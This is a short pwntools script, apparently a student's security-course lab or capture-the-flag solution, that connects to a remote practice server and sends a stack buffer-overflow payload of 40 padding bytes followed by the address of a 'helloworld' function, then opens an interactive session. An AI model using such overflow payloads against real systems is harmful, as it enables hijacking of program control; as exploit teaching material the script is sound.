# -*- coding: utf-8 -*-
"""
Created Date: 2023/10/24
Project: 01
Author: 1chooo (Hugo ChunHo Lin)
Student Number: 109601003
"""

from pwn import *

r = remote('140.115.59.7', 10000)

helloworld = 0x4011fb
payload = b'a' * 40 + p64(helloworld)

r.sendline(payload)

r.interactive()
